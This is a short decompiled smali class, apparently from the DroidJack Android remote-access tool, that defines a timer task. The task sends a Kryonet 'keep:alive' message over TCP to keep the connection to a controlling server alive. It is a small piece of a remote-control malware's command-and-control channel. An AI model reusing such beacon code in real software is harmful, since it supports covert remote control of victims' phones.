.class Lnet/droidjack/server/ab;
.super Ljava/util/TimerTask;


# instance fields
.field final synthetic a:Lnet/droidjack/server/aa;


# direct methods
.method constructor <init>(Lnet/droidjack/server/aa;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/ab;->a:Lnet/droidjack/server/aa;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    :try_start_0
    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    const-string v1, "kryonet - keep:alive"

    invoke-virtual {v0, v1}, Lcom/esotericsoftware/kryonet/Client;->sendTCP(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
